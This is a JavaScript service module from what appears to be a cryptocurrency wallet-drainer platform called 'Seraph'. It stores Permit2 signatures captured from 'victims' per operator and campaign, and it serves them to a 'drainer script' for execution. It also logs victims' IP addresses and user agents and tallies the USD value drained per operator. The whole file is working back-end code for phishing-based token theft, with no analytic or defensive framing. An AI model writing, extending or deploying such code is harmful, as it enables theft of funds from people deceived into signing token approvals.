/**
 * ============================================================================
 * SERAPH SERVER - Signature Service (v4 - Option C: One per Victim+Token)
 * ============================================================================
 * 
 * v4 CHANGES:
 * - Option C: One pending signature per victim + token (regardless of type)
 * - If user signs permit2_batch then permit2_single for same token → UPDATE
 * - Latest signature = freshest nonce/deadline = highest success rate
 * 
 * Duplicate detection:
 * - Check ALL pending signatures for this campaign + victim
 * - If ANY signature has overlapping token addresses → UPDATE it
 * - Otherwise → INSERT new
 * 
 * ============================================================================
 */

import supabase from '../config/supabase.js'

/**
 * Store a captured signature (with Option C duplicate prevention)
 * 
 * Option C: One pending signature per victim + token
 * - Matches by token address, NOT by signature_type
 * - Latest signature replaces older one for same token
 */
export async function storeSignature({
  operatorId,
  campaignId,
  walletId,
  victimAddress,
  signatureType,
  signature,
  permitData,
  domain,
  message,
  tokens,
  totalValueUsd,
  chainId = 11155111,
  deadline,
  ipAddress,
  userAgent
}) {
  // Normalize addresses
  const normalizedVictim = victimAddress?.toLowerCase()
  
  // Extract token addresses from incoming signature
  const incomingTokens = (tokens || [])
    .map(t => (t.address || t.token_address || '').toLowerCase())
    .filter(Boolean)
  
  // =========================================================================
  // OPTION C: Check for ANY pending signature with overlapping tokens
  // =========================================================================
  
  let existing = null
  
  if (incomingTokens.length > 0) {
    // Get ALL pending signatures for this campaign + victim
    const { data: pendingSignatures, error: queryError } = await supabase
      .from('signatures')
      .select('id, signature_type, tokens, created_at')
      .eq('campaign_id', campaignId)
      .eq('victim_address', normalizedVictim)
      .eq('status', 'pending')
      .order('created_at', { ascending: false })
    
    if (queryError) {
      console.error('[Signature] Query error:', queryError.message)
    }
    
    // Find one with overlapping token addresses
    if (pendingSignatures && pendingSignatures.length > 0) {
      for (const sig of pendingSignatures) {
        const existingTokens = (sig.tokens || [])
          .map(t => (t.address || '').toLowerCase())
          .filter(Boolean)
        
        // Check if ANY token overlaps
        const hasOverlap = incomingTokens.some(addr => existingTokens.includes(addr))
        
        if (hasOverlap) {
          existing = sig
          console.log(`[Signature] Found overlapping signature ${sig.id} (${sig.signature_type}) for tokens`)
          break
        }
      }
    }
  }
  
  if (existing) {
    // UPDATE existing signature with fresh data
    console.log(`[Signature] Updating ${existing.signature_type} → ${signatureType} for victim ${normalizedVictim}`)
    
    const { data, error } = await supabase
      .from('signatures')
      .update({
        signature_type: signatureType,  // Update type too (batch → single)
        signature,
        permit_data: permitData,
        domain,
        message,
        tokens,
        total_value_usd: totalValueUsd,
        chain_id: chainId,
        deadline,
        ip_address: ipAddress,
        user_agent: userAgent,
        updated_at: new Date().toISOString()
      })
      .eq('id', existing.id)
      .select()
      .single()
    
    if (error) {
      throw new Error(error.message)
    }
    
    return { ...data, updated: true }
  }
  
  // No existing - INSERT new
  console.log(`[Signature] Creating new ${signatureType} signature for ${normalizedVictim}`)
  
  const { data, error } = await supabase
    .from('signatures')
    .insert({
      operator_id: operatorId,
      campaign_id: campaignId,
      wallet_id: walletId,
      victim_address: normalizedVictim,
      signature_type: signatureType,
      signature,
      permit_data: permitData,
      domain,
      message,
      tokens,
      total_value_usd: totalValueUsd,
      chain_id: chainId,
      deadline,
      ip_address: ipAddress,
      user_agent: userAgent,
      status: 'pending'
    })
    .select()
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  return { ...data, updated: false }
}

/**
 * Store signature by campaign key (for drainer script)
 */
export async function storeSignatureByKey({
  campaignKey,
  victimAddress,
  signatureType,
  signature,
  permitData,
  domain,
  message,
  tokens,
  totalValueUsd,
  chainId,
  deadline,
  ipAddress,
  userAgent
}) {
  const { data: campaign, error: campaignError } = await supabase
    .from('campaigns')
    .select('id, operator_id, wallet_id')
    .eq('campaign_key', campaignKey)
    .eq('status', 'active')
    .single()
  
  if (campaignError || !campaign) {
    throw new Error('Invalid or inactive campaign key')
  }
  
  return storeSignature({
    operatorId: campaign.operator_id,
    campaignId: campaign.id,
    walletId: campaign.wallet_id,
    victimAddress,
    signatureType,
    signature,
    permitData,
    domain,
    message,
    tokens,
    totalValueUsd,
    chainId,
    deadline,
    ipAddress,
    userAgent
  })
}

/**
 * Get signatures for operator
 */
export async function getSignatures(operatorId, {
  page = 1,
  limit = 20,
  status,
  signatureType,
  campaignId,
  victimAddress
}) {
  let query = supabase
    .from('signatures')
    .select(`
      *,
      campaign:campaigns(id, name, domain)
    `, { count: 'exact' })
    .eq('operator_id', operatorId)
  
  if (status) {
    query = query.eq('status', status)
  }
  
  if (signatureType) {
    query = query.eq('signature_type', signatureType)
  }
  
  if (campaignId) {
    query = query.eq('campaign_id', campaignId)
  }
  
  if (victimAddress) {
    query = query.ilike('victim_address', victimAddress)
  }
  
  query = query.order('created_at', { ascending: false })
  
  const from = (page - 1) * limit
  query = query.range(from, from + limit - 1)
  
  const { data, error, count } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return {
    signatures: data,
    total: count,
    page,
    limit
  }
}

/**
 * Get all signatures (admin)
 */
export async function getAllSignatures({
  page = 1,
  limit = 20,
  status,
  signatureType,
  operatorId,
  campaignId,
  victimAddress
}) {
  let query = supabase
    .from('signatures')
    .select(`
      *,
      operator:operators(id, username, email),
      campaign:campaigns(id, name, domain)
    `, { count: 'exact' })
  
  if (status) {
    query = query.eq('status', status)
  }
  
  if (signatureType) {
    query = query.eq('signature_type', signatureType)
  }
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  if (campaignId) {
    query = query.eq('campaign_id', campaignId)
  }
  
  if (victimAddress) {
    query = query.ilike('victim_address', victimAddress)
  }
  
  query = query.order('created_at', { ascending: false })
  
  const from = (page - 1) * limit
  query = query.range(from, from + limit - 1)
  
  const { data, error, count } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return {
    signatures: data,
    total: count,
    page,
    limit
  }
}

/**
 * Get signature by ID
 */
export async function getSignatureById(signatureId, operatorId = null) {
  let query = supabase
    .from('signatures')
    .select(`
      *,
      operator:operators(id, username, email),
      campaign:campaigns(id, name, domain, wallet_id),
      drain_log:drain_logs(id, tx_hash, status, created_at)
    `)
    .eq('id', signatureId)
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { data, error } = await query.single()
  
  if (error) {
    throw new Error('Signature not found')
  }
  
  return data
}

/**
 * Get pending signatures for a victim (for execution)
 */
export async function getPendingSignatures(victimAddress, operatorId = null) {
  const normalizedVictim = victimAddress?.toLowerCase()
  
  let query = supabase
    .from('signatures')
    .select('*')
    .ilike('victim_address', normalizedVictim)
    .eq('status', 'pending')
    .order('created_at', { ascending: true })
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { data, error } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return data
}

/**
 * Update signature status
 */
export async function updateSignatureStatus(signatureId, {
  status,
  txHash,
  drainLogId,
  errorMessage,
  blockedBy
}) {
  const updates = {
    status,
    updated_at: new Date().toISOString()
  }
  
  if (status === 'executed' || status === 'failed' || status === 'blocked') {
    updates.executed_at = new Date().toISOString()
  }
  
  if (txHash) updates.tx_hash = txHash
  if (drainLogId) updates.drain_log_id = drainLogId
  if (errorMessage) updates.error_message = errorMessage
  if (blockedBy) updates.blocked_by = blockedBy
  
  const { data, error } = await supabase
    .from('signatures')
    .update(updates)
    .eq('id', signatureId)
    .select()
    .single()
  
  if (error) {
    throw new Error(error.message)
  }
  
  return data
}

/**
 * Mark signature as executing
 */
export async function markExecuting(signatureId) {
  return updateSignatureStatus(signatureId, { status: 'executing' })
}

/**
 * Mark signature as executed
 */
export async function markExecuted(signatureId, txHash, drainLogId) {
  return updateSignatureStatus(signatureId, {
    status: 'executed',
    txHash,
    drainLogId
  })
}

/**
 * Mark signature as failed
 */
export async function markFailed(signatureId, errorMessage) {
  return updateSignatureStatus(signatureId, {
    status: 'failed',
    errorMessage
  })
}

/**
 * Mark signature as blocked
 */
export async function markBlocked(signatureId, blockedBy) {
  return updateSignatureStatus(signatureId, {
    status: 'blocked',
    blockedBy
  })
}

/**
 * Check and mark expired signatures
 */
export async function markExpiredSignatures() {
  const now = Math.floor(Date.now() / 1000)
  
  const { data, error } = await supabase
    .from('signatures')
    .update({
      status: 'expired',
      updated_at: new Date().toISOString()
    })
    .eq('status', 'pending')
    .lt('deadline', now)
    .select('id')
  
  if (error) {
    console.error('Failed to mark expired signatures:', error.message)
    return 0
  }
  
  return data?.length || 0
}

/**
 * Delete signature
 */
export async function deleteSignature(signatureId, operatorId = null) {
  let query = supabase
    .from('signatures')
    .delete()
    .eq('id', signatureId)
  
  if (operatorId) {
    query = query.eq('operator_id', operatorId)
  }
  
  const { error } = await query
  
  if (error) {
    throw new Error(error.message)
  }
  
  return true
}

/**
 * Get signature stats for operator
 */
export async function getSignatureStats(operatorId) {
  const { data, error } = await supabase
    .from('signatures')
    .select('status, total_value_usd')
    .eq('operator_id', operatorId)
  
  if (error) {
    throw new Error(error.message)
  }
  
  const stats = {
    total: data.length,
    pending: 0,
    executed: 0,
    failed: 0,
    blocked: 0,
    expired: 0,
    totalValuePending: 0,
    totalValueExecuted: 0,
    totalValueBlocked: 0
  }
  
  data.forEach(sig => {
    stats[sig.status] = (stats[sig.status] || 0) + 1
    
    if (sig.status === 'pending') {
      stats.totalValuePending += parseFloat(sig.total_value_usd || 0)
    } else if (sig.status === 'executed') {
      stats.totalValueExecuted += parseFloat(sig.total_value_usd || 0)
    } else if (sig.status === 'blocked') {
      stats.totalValueBlocked += parseFloat(sig.total_value_usd || 0)
    }
  })
  
  return stats
}

export default {
  storeSignature,
  storeSignatureByKey,
  getSignatures,
  getAllSignatures,
  getSignatureById,
  getPendingSignatures,
  updateSignatureStatus,
  markExecuting,
  markExecuted,
  markFailed,
  markBlocked,
  markExpiredSignatures,
  deleteSignature,
  getSignatureStats
}